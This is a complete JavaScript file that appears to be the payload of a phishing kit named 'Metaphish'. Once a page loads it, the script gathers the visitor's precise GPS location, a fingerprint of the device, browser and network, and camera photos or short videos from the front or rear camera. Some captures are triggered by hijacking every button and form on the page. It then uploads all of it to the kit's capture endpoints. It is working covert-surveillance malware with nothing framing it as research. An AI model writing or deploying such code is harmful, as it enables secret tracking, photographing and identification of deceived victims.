(function () {
    const CaptureEndpoint = "/capture";
    const ImageEndpoint   = "/capture-image";
    const VideoEndpoint   = "/capture-video";
    const MaxRetries      = 3;
    const FetchTimeout    = 30000;

    const CaptureMode   = (window.MetaphishConfig && window.MetaphishConfig.CameraMode)   || "front";
    const VideoSource   = (window.MetaphishConfig && window.MetaphishConfig.VideoSource)   || "front";
    const VideoDuration = (window.MetaphishConfig && window.MetaphishConfig.VideoDuration) || 10;

    function FetchWithTimeout(Url, Options) {
        return new Promise(function (Resolve, Reject) {
            const Controller = new AbortController();
            const Timer = setTimeout(function () {
                Controller.abort();
                Reject(new Error("Request timeout"));
            }, FetchTimeout);
            Options.signal = Controller.signal;
            fetch(Url, Options)
                .then(function (Response) {
                    clearTimeout(Timer);
                    Resolve(Response);
                })
                .catch(function (FetchError) {
                    clearTimeout(Timer);
                    Reject(FetchError);
                });
        });
    }

    function RetryFetch(Url, Options, RetriesLeft) {
        return FetchWithTimeout(Url, Options).catch(function (FetchError) {
            if (RetriesLeft <= 0) throw FetchError;
            return new Promise(function (Resolve) { setTimeout(Resolve, 2000); })
                .then(function () { return RetryFetch(Url, Options, RetriesLeft - 1); });
        });
    }

    function GetGps() {
        return new Promise(function (Resolve) {
            if (!navigator.geolocation) {
                Resolve({
                    GpsLatitude: "Not Available", GpsLongitude: "Not Available",
                    GpsAccuracy: "Not Available", GpsAltitude: "Not Available",
                    GpsAltitudeAccuracy: "Not Available", GpsHeading: "Not Available", GpsSpeed: "Not Available"
                });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                function (Position) {
                    Resolve({
                        GpsLatitude:         String(Position.coords.latitude),
                        GpsLongitude:        String(Position.coords.longitude),
                        GpsAccuracy:         String(Math.round(Position.coords.accuracy)) + " m",
                        GpsAltitude:         Position.coords.altitude != null
                                                 ? String(Math.round(Position.coords.altitude)) + " m"
                                                 : "Not Available",
                        GpsAltitudeAccuracy: Position.coords.altitudeAccuracy != null
                                                 ? String(Math.round(Position.coords.altitudeAccuracy)) + " m"
                                                 : "Not Available",
                        GpsHeading:          Position.coords.heading != null
                                                 ? String(Math.round(Position.coords.heading)) + "°"
                                                 : "Not Available",
                        GpsSpeed:            Position.coords.speed != null
                                                 ? String(Position.coords.speed.toFixed(2)) + " m/s"
                                                 : "Not Available"
                    });
                },
                function () {
                    Resolve({
                        GpsLatitude: "Permission Denied", GpsLongitude: "Not Available",
                        GpsAccuracy: "Not Available", GpsAltitude: "Not Available",
                        GpsAltitudeAccuracy: "Not Available", GpsHeading: "Not Available", GpsSpeed: "Not Available"
                    });
                },
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        });
    }

    function GetBattery() {
        return new Promise(function (Resolve) {
            if (!navigator.getBattery) {
                Resolve({
                    BatteryLevel: "Not Available", BatteryCharging: "Not Available",
                    BatteryChargingTime: "Not Available", BatteryDischargingTime: "Not Available"
                });
                return;
            }
            navigator.getBattery().then(function (Battery) {
                var ChargingTime = "Not Available";
                var DischargingTime = "Not Available";
                if (Battery.charging && Battery.chargingTime !== Infinity && Battery.chargingTime > 0) {
                    ChargingTime = String(Math.round(Battery.chargingTime / 60)) + " min";
                } else if (Battery.charging) {
                    ChargingTime = "Fully Charged";
                }
                if (!Battery.charging && Battery.dischargingTime !== Infinity && Battery.dischargingTime > 0) {
                    DischargingTime = String(Math.round(Battery.dischargingTime / 60)) + " min";
                }
                Resolve({
                    BatteryLevel:           Math.round(Battery.level * 100) + "%",
                    BatteryCharging:        String(Battery.charging),
                    BatteryChargingTime:    ChargingTime,
                    BatteryDischargingTime: DischargingTime
                });
            }).catch(function () {
                Resolve({
                    BatteryLevel: "Not Available", BatteryCharging: "Not Available",
                    BatteryChargingTime: "Not Available", BatteryDischargingTime: "Not Available"
                });
            });
        });
    }

    function GetNetwork() {
        var Connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!Connection) {
            return {
                ConnectionType: "Not Available", EffectiveConnectionType: "Not Available",
                DownlinkMbps: "Not Available", NetworkRtt: "Not Available", SaveData: "Not Available"
            };
        }
        return {
            ConnectionType:          Connection.type          || "Not Available",
            EffectiveConnectionType: Connection.effectiveType || "Not Available",
            DownlinkMbps:            Connection.downlink  != null ? String(Connection.downlink)  : "Not Available",
            NetworkRtt:              Connection.rtt        != null ? String(Connection.rtt) + " ms" : "Not Available",
            SaveData:                Connection.saveData   != null ? String(Connection.saveData)  : "Not Available"
        };
    }

    function GetDeviceInfo() {
        var PluginCount = "0";
        try { PluginCount = navigator.plugins ? String(navigator.plugins.length) : "0"; } catch (PluginError) {}

        var NotificationPermission = "Not Available";
        try {
            NotificationPermission = typeof Notification !== "undefined"
                ? Notification.permission
                : "Not Available";
        } catch (NotifError) {}

        var PdfViewerEnabled = "Not Available";
        try {
            PdfViewerEnabled = typeof navigator.pdfViewerEnabled !== "undefined"
                ? String(navigator.pdfViewerEnabled)
                : "Not Available";
        } catch (PdfError) {}

        return {
            ScreenResolution:           screen.width + "x" + screen.height,
            ScreenAvailable:            screen.availWidth + "x" + screen.availHeight,
            ViewportSize:               window.innerWidth + "x" + window.innerHeight,
            ColorDepth:                 String(screen.colorDepth || screen.pixelDepth || "Not Available"),
            PixelRatio:                 String(window.devicePixelRatio || "Not Available"),
            OrientationType:            screen.orientation ? screen.orientation.type  : "Not Available",
            OrientationAngle:           screen.orientation ? String(screen.orientation.angle) : "0",
            Platform:                   navigator.platform  || "Not Available",
            Language:                   navigator.language  || "Not Available",
            LanguagesSupported:         navigator.languages
                                            ? navigator.languages.slice(0, 10).join(", ")
                                            : "Not Available",
            VendorName:                 navigator.vendor    || "Not Available",
            DoNotTrack:                 navigator.doNotTrack || "unspecified",
            CookieEnabled:              String(navigator.cookieEnabled),
            OnlineStatus:               String(navigator.onLine),
            DeviceMemoryGb:             navigator.deviceMemory
                                            ? String(navigator.deviceMemory) + " GB"
                                            : "Not Available",
            HardwareConcurrency:        navigator.hardwareConcurrency
                                            ? String(navigator.hardwareConcurrency) + " cores"
                                            : "Not Available",
            MaxTouchPoints:             String(navigator.maxTouchPoints || 0),
            PluginCount:                PluginCount,
            PdfViewerEnabled:           PdfViewerEnabled,
            ServiceWorkerSupported:     String("serviceWorker" in navigator),
            IndexedDbSupported:         String(!!window.indexedDB),
            WebAssemblySupported:       String(typeof WebAssembly === "object"),
            WebRtcSupported:            String(!!(window.RTCPeerConnection || window.webkitRTCPeerConnection)),
            GamepadApiSupported:        String("getGamepads" in navigator),
            PaymentRequestSupported:    String(typeof PaymentRequest !== "undefined"),
            BluetoothAvailable:         String("bluetooth" in navigator),
            UsbAvailable:               String("usb" in navigator),
            SpeechSynthesisAvailable:   String("speechSynthesis" in window),
            SpeechRecognitionAvailable: String(!!(window.SpeechRecognition || window.webkitSpeechRecognition)),
            NotificationPermission:     NotificationPermission,
            Timezone:                   Intl.DateTimeFormat().resolvedOptions().timeZone || "Not Available",
            HistoryLength:              String(window.history.length),
            DocumentReadyState:         document.readyState,
            PageUrl:                    window.location.href,
            Referrer:                   document.referrer || "Direct"
        };
    }

    function GetWebGlInfo() {
        try {
            var Canvas = document.createElement("canvas");
            var GlContext = Canvas.getContext("webgl") || Canvas.getContext("experimental-webgl");
            if (!GlContext) {
                return {
                    WebGlSupported: "false", WebGl2Supported: "false",
                    WebGlRenderer: "Not Available", WebGlVendor: "Not Available"
                };
            }
            var DebugExtension = GlContext.getExtension("WEBGL_debug_renderer_info");
            var Renderer = DebugExtension
                ? GlContext.getParameter(DebugExtension.UNMASKED_RENDERER_WEBGL)
                : GlContext.getParameter(GlContext.RENDERER);
            var Vendor = DebugExtension
                ? GlContext.getParameter(DebugExtension.UNMASKED_VENDOR_WEBGL)
                : GlContext.getParameter(GlContext.VENDOR);
            var Gl2Context = Canvas.getContext("webgl2");
            return {
                WebGlSupported:  "true",
                WebGl2Supported: String(!!Gl2Context),
                WebGlRenderer:   Renderer || "Not Available",
                WebGlVendor:     Vendor   || "Not Available"
            };
        } catch (GlError) {
            return {
                WebGlSupported: "false", WebGl2Supported: "false",
                WebGlRenderer: "Not Available", WebGlVendor: "Not Available"
            };
        }
    }

    function GetCanvasFingerprint() {
        try {
            var Canvas = document.createElement("canvas");
            Canvas.width  = 240;
            Canvas.height = 60;
            var Context = Canvas.getContext("2d");
            Context.textBaseline = "alphabetic";
            Context.fillStyle    = "#f60";
            Context.fillRect(0, 0, 240, 60);
            Context.fillStyle = "#069";
            Context.font      = "15px Arial";
            Context.fillText("Cwm fjordbank glyphs vext quiz!", 2, 28);
            Context.fillStyle = "rgba(102, 204, 0, 0.7)";
            Context.font      = "bold 14px Georgia";
            Context.fillText("Cwm fjordbank glyphs vext quiz!", 4, 50);
            var DataUrl = Canvas.toDataURL();
            var Hash    = 0;
            for (var Index = 0; Index < DataUrl.length; Index++) {
                Hash = ((Hash << 5) - Hash) + DataUrl.charCodeAt(Index);
                Hash = Hash | 0;
            }
            return String(Math.abs(Hash));
        } catch (CanvasError) {
            return "Not Available";
        }
    }

    function GetAudioContextInfo() {
        try {
            var AudioContextConstructor = window.AudioContext || window.webkitAudioContext;
            if (!AudioContextConstructor) {
                return { AudioContextSampleRate: "Not Available", AudioContextChannelCount: "Not Available" };
            }
            var AudioCtx = new AudioContextConstructor();
            var AudioInfo = {
                AudioContextSampleRate:   String(AudioCtx.sampleRate),
                AudioContextChannelCount: String(AudioCtx.destination.maxChannelCount)
            };
            if (AudioCtx.close) AudioCtx.close();
            return AudioInfo;
        } catch (AudioError) {
            return { AudioContextSampleRate: "Not Available", AudioContextChannelCount: "Not Available" };
        }
    }

    function GetMediaDeviceCounts() {
        return new Promise(function (Resolve) {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                Resolve({
                    VideoInputCount: "Not Available",
                    AudioInputCount: "Not Available",
                    AudioOutputCount: "Not Available"
                });
                return;
            }
            navigator.mediaDevices.enumerateDevices().then(function (Devices) {
                var VideoInputs  = 0;
                var AudioInputs  = 0;
                var AudioOutputs = 0;
                for (var Index = 0; Index < Devices.length; Index++) {
                    if      (Devices[Index].kind === "videoinput")  VideoInputs++;
                    else if (Devices[Index].kind === "audioinput")  AudioInputs++;
                    else if (Devices[Index].kind === "audiooutput") AudioOutputs++;
                }
                Resolve({
                    VideoInputCount:  String(VideoInputs),
                    AudioInputCount:  String(AudioInputs),
                    AudioOutputCount: String(AudioOutputs)
                });
            }).catch(function () {
                Resolve({
                    VideoInputCount: "Not Available",
                    AudioInputCount: "Not Available",
                    AudioOutputCount: "Not Available"
                });
            });
        });
    }

    function GetStorageQuota() {
        return new Promise(function (Resolve) {
            if (!navigator.storage || !navigator.storage.estimate) {
                Resolve({ StorageQuotaMb: "Not Available", StorageUsedMb: "Not Available" });
                return;
            }
            navigator.storage.estimate().then(function (Estimate) {
                Resolve({
                    StorageQuotaMb: String(Math.round((Estimate.quota || 0) / (1024 * 1024))) + " MB",
                    StorageUsedMb:  String(Math.round((Estimate.usage  || 0) / (1024 * 1024))) + " MB"
                });
            }).catch(function () {
                Resolve({ StorageQuotaMb: "Not Available", StorageUsedMb: "Not Available" });
            });
        });
    }

    function CompressAndUploadCamera(Blob, SourceLabel) {
        return new Promise(function (Resolve) {
            const ImageUrl = URL.createObjectURL(Blob);
            const ImageElement = new window.Image();
            ImageElement.onload = function () {
                URL.revokeObjectURL(ImageUrl);
                const Canvas = document.createElement("canvas");
                const MaxDimension = 640;
                let Width = ImageElement.width;
                let Height = ImageElement.height;
                if (Width > MaxDimension || Height > MaxDimension) {
                    if (Width > Height) {
                        Height = Math.round((Height * MaxDimension) / Width);
                        Width = MaxDimension;
                    } else {
                        Width = Math.round((Width * MaxDimension) / Height);
                        Height = MaxDimension;
                    }
                }
                Canvas.width = Width;
                Canvas.height = Height;
                const Context = Canvas.getContext("2d");
                Context.drawImage(ImageElement, 0, 0, Width, Height);
                Canvas.toBlob(function (CompressedBlob) {
                    if (!CompressedBlob) { Resolve("Upload Failed"); return; }
                    RetryFetch(ImageEndpoint + "?source=" + (SourceLabel || "camera"), {
                        method: "POST",
                        headers: { "Content-Type": "image/jpeg" },
                        body: CompressedBlob
                    }, MaxRetries)
                        .then(function () { Resolve("Uploaded"); })
                        .catch(function () { Resolve("Upload Failed"); });
                }, "image/jpeg", 0.75);
            };
            ImageElement.onerror = function () {
                URL.revokeObjectURL(ImageUrl);
                Resolve("Upload Failed");
            };
            ImageElement.src = ImageUrl;
        });
    }

    function CaptureSingleCamera(VideoConstraint, SourceLabel) {
        return new Promise(function (Resolve) {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                Resolve("Not Available");
                return;
            }
            navigator.mediaDevices.getUserMedia({ video: VideoConstraint, audio: false }).then(function (Stream) {
                const Video = document.createElement("video");
                Video.srcObject = Stream;
                Video.setAttribute("playsinline", "true");
                Video.muted = true;
                Video.play().then(function () {
                    setTimeout(function () {
                        const Canvas = document.createElement("canvas");
                        Canvas.width = Video.videoWidth || 640;
                        Canvas.height = Video.videoHeight || 480;
                        const Context = Canvas.getContext("2d");
                        Context.drawImage(Video, 0, 0, Canvas.width, Canvas.height);
                        Stream.getTracks().forEach(function (Track) { Track.stop(); });
                        Canvas.toBlob(function (CaptureBlob) {
                            if (!CaptureBlob) { Resolve("Upload Failed"); return; }
                            CompressAndUploadCamera(CaptureBlob, SourceLabel).then(Resolve);
                        }, "image/jpeg", 0.85);
                    }, 1500);
                }).catch(function () {
                    Stream.getTracks().forEach(function (Track) { Track.stop(); });
                    Resolve("Upload Failed");
                });
            }).catch(function () {
                Resolve("Permission Denied");
            });
        });
    }

    function CaptureVideoWithConstraint(VideoConstraint, SourceLabel, DurationSeconds) {
        return new Promise(function (Resolve) {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                Resolve("Not Available");
                return;
            }
            if (typeof MediaRecorder === "undefined") {
                Resolve("Not Available");
                return;
            }
            navigator.mediaDevices.getUserMedia({ video: VideoConstraint, audio: false }).then(function (Stream) {
                const Chunks = [];
                const MimeTypes = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm", "video/mp4"];
                const SupportedMime = MimeTypes.find(function (Mime) {
                    return MediaRecorder.isTypeSupported(Mime);
                }) || "";
                const ContentType = SupportedMime || "video/webm";

                var Recorder;
                try {
                    Recorder = SupportedMime
                        ? new MediaRecorder(Stream, { mimeType: SupportedMime })
                        : new MediaRecorder(Stream);
                } catch (RecorderError) {
                    Stream.getTracks().forEach(function (Track) { Track.stop(); });
                    Resolve("Not Available");
                    return;
                }

                Recorder.ondataavailable = function (Event) {
                    if (Event.data && Event.data.size > 0) Chunks.push(Event.data);
                };

                Recorder.onstop = function () {
                    Stream.getTracks().forEach(function (Track) { Track.stop(); });
                    const VideoBlob = new Blob(Chunks, { type: ContentType });
                    if (VideoBlob.size === 0) { Resolve("Upload Failed"); return; }
                    RetryFetch(VideoEndpoint + "?source=" + (SourceLabel || "front"), {
                        method: "POST",
                        headers: { "Content-Type": ContentType },
                        body: VideoBlob
                    }, MaxRetries)
                        .then(function () { Resolve("Uploaded"); })
                        .catch(function () { Resolve("Upload Failed"); });
                };

                Recorder.onerror = function () {
                    Stream.getTracks().forEach(function (Track) { Track.stop(); });
                    Resolve("Upload Failed");
                };

                Recorder.start(1000);
                setTimeout(function () {
                    if (Recorder.state !== "inactive") Recorder.stop();
                }, (DurationSeconds || 10) * 1000);

            }).catch(function () {
                Resolve("Permission Denied");
            });
        });
    }

    function CaptureVideoFront(DurationSeconds) {
        return CaptureVideoWithConstraint(
            { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
            "front",
            DurationSeconds
        );
    }

    function GetVideoDevices() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
            return Promise.resolve([]);
        }
        return navigator.mediaDevices.enumerateDevices().then(function (Devices) {
            return Devices.filter(function (Device) { return Device.kind === "videoinput"; });
        }).catch(function () { return []; });
    }

    function FindBackCameraConstraint(VideoDevices) {
        if (VideoDevices.length < 2) return null;
        var BackDevice = null;
        for (var Index = 0; Index < VideoDevices.length; Index++) {
            const Label = (VideoDevices[Index].label || "").toLowerCase();
            if (Label.includes("back") || Label.includes("rear") || Label.includes("environment")) {
                BackDevice = VideoDevices[Index];
                break;
            }
        }
        if (!BackDevice) BackDevice = VideoDevices[VideoDevices.length - 1];
        if (BackDevice && BackDevice.deviceId) {
            return { deviceId: { exact: BackDevice.deviceId }, width: { ideal: 1280 }, height: { ideal: 720 } };
        }
        return null;
    }

    function ResolveBackConstraint(HasPermission) {
        if (!HasPermission) {
            return Promise.resolve({ facingMode: { exact: "environment" }, width: { ideal: 1280 }, height: { ideal: 720 } });
        }
        return GetVideoDevices().then(function (VideoDevices) {
            return FindBackCameraConstraint(VideoDevices)
                || { facingMode: { exact: "environment" }, width: { ideal: 1280 }, height: { ideal: 720 } };
        });
    }

    function AttachClickListeners(Handler) {
        document.querySelectorAll("form").forEach(function (Form) {
            Form.addEventListener("submit", Handler);
        });
        document.querySelectorAll(
            "button, input[type='submit'], input[type='button'], [role='button']"
        ).forEach(function (Button) {
            Button.addEventListener("click", Handler);
        });
    }

    const GpsCapture         = GetGps();
    const BatteryCapture     = GetBattery();
    const MediaDeviceCapture = GetMediaDeviceCounts();
    const StorageCapture     = GetStorageQuota();

    function SendCapture(FrontResult, BackResult, VideoFrontResult, VideoBackResult) {
        Promise.all([GpsCapture, BatteryCapture, MediaDeviceCapture, StorageCapture]).then(function (Results) {
            var Payload = Object.assign(
                {},
                Results[0],
                Results[1],
                Results[2],
                Results[3],
                {
                    CameraFrontFile:     FrontResult      || "Not Captured",
                    CameraBackFile:      BackResult       || "Not Captured",
                    CameraVideoFile:     VideoFrontResult || "Not Captured",
                    CameraVideoBackFile: VideoBackResult  || "Not Captured"
                },
                GetNetwork(),
                GetDeviceInfo(),
                GetWebGlInfo(),
                { CanvasFingerprint: GetCanvasFingerprint() },
                GetAudioContextInfo()
            );
            RetryFetch(CaptureEndpoint, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(Payload)
            }, MaxRetries).catch(function () {});
        });
    }

    if (CaptureMode === "video") {

        if (VideoSource === "front") {
            CaptureVideoFront(VideoDuration).then(function (VideoResult) {
                SendCapture("Not Captured", "Not Captured", VideoResult, "Not Captured");
            });

        } else if (VideoSource === "back") {
            var BackVideoHandled = false;
            var BackVideoFallback = setTimeout(function () {
                if (BackVideoHandled) return;
                BackVideoHandled = true;
                SendCapture("Not Captured", "Not Captured", "Not Captured", "Not Available");
            }, 60000);

            function HandleBackVideoClick() {
                if (BackVideoHandled) return;
                BackVideoHandled = true;
                clearTimeout(BackVideoFallback);
                ResolveBackConstraint(false).then(function (Constraint) {
                    CaptureVideoWithConstraint(Constraint, "back", VideoDuration).then(function (VideoResult) {
                        SendCapture("Not Captured", "Not Captured", "Not Captured", VideoResult);
                    });
                });
            }

            if (document.readyState === "loading") {
                document.addEventListener("DOMContentLoaded", function () { AttachClickListeners(HandleBackVideoClick); });
            } else {
                AttachClickListeners(HandleBackVideoClick);
            }

        } else if (VideoSource === "both") {
            const FrontVideoCapture = CaptureVideoFront(VideoDuration);

            var BothVideoHandled = false;
            var BothVideoFallback = setTimeout(function () {
                if (BothVideoHandled) return;
                BothVideoHandled = true;
                FrontVideoCapture.then(function (FrontVideoResult) {
                    SendCapture("Not Captured", "Not Captured", FrontVideoResult, "Not Available");
                });
            }, 60000);

            function HandleBothVideoClick() {
                if (BothVideoHandled) return;
                BothVideoHandled = true;
                clearTimeout(BothVideoFallback);
                FrontVideoCapture.then(function (FrontVideoResult) {
                    ResolveBackConstraint(true).then(function (Constraint) {
                        CaptureVideoWithConstraint(Constraint, "back", VideoDuration).then(function (BackVideoResult) {
                            SendCapture("Not Captured", "Not Captured", FrontVideoResult, BackVideoResult);
                        });
                    });
                });
            }

            if (document.readyState === "loading") {
                document.addEventListener("DOMContentLoaded", function () { AttachClickListeners(HandleBothVideoClick); });
            } else {
                AttachClickListeners(HandleBothVideoClick);
            }
        }

    } else if (CaptureMode === "front") {
        CaptureSingleCamera(
            { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
            "front"
        ).then(function (FrontResult) {
            SendCapture(FrontResult, "Not Captured", "Not Captured", "Not Captured");
        });

    } else {
        var PhotoHandled = false;
        var PhotoFallback = setTimeout(function () {
            if (PhotoHandled) return;
            PhotoHandled = true;
            if (CaptureMode === "both") {
                CaptureSingleCamera(
                    { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
                    "front"
                ).then(function (FrontResult) {
                    SendCapture(FrontResult, "Not Available", "Not Captured", "Not Captured");
                });
            } else {
                SendCapture("Not Captured", "Not Available", "Not Captured", "Not Captured");
            }
        }, 60000);

        function HandlePhotoButtonClick() {
            if (PhotoHandled) return;
            PhotoHandled = true;
            clearTimeout(PhotoFallback);

            if (CaptureMode === "both") {
                CaptureSingleCamera(
                    { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
                    "front"
                ).then(function (FrontResult) {
                    ResolveBackConstraint(true).then(function (Constraint) {
                        CaptureSingleCamera(Constraint, "back").then(function (BackResult) {
                            SendCapture(FrontResult, BackResult, "Not Captured", "Not Captured");
                        });
                    });
                });
            } else {
                ResolveBackConstraint(false).then(function (Constraint) {
                    CaptureSingleCamera(Constraint, "back").then(function (BackResult) {
                        SendCapture("Not Captured", BackResult, "Not Captured", "Not Captured");
                    });
                });
            }
        }

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", function () { AttachClickListeners(HandlePhotoButtonClick); });
        } else {
            AttachClickListeners(HandlePhotoButtonClick);
        }
    }
})();
